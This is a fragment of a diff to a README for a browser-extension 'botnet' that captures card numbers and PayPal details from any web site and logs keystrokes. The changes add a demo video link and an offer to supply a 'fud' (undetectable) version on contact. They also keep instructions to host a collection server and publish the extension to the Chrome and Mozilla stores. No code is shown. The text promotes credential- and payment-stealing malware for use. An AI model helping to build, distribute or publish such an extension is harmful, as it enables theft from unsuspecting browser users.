@@ -10,14 +10,14 @@ botnet browser chrome,mozilla firefox,capture card number any web site ,paypal,f
 
 ![3](https://user-images.githubusercontent.com/30985149/51928145-1e0e8480-23ed-11e9-9e69-cf2c8268e80a.png)
 
-# demo video Youtub 
-wait today
+# demo video Youtub (new version php but older javascript code )
+https://youtu.be/ljZsw3bRxPY
 
-# what do you need ? this is older version
+# what do you need ? this is older version if you need a fud version contact me
 
 -web server for exemple hosgator, or free hosting (00webhost ) or wampserver or xhampp ... to test your extension
 
--publish your extension in  chrome web store or adon mozilla ( video can found here )
+-publish your extension in  chrome web store or adon mozilla 
 
 # how it works ?
 1) open keylog
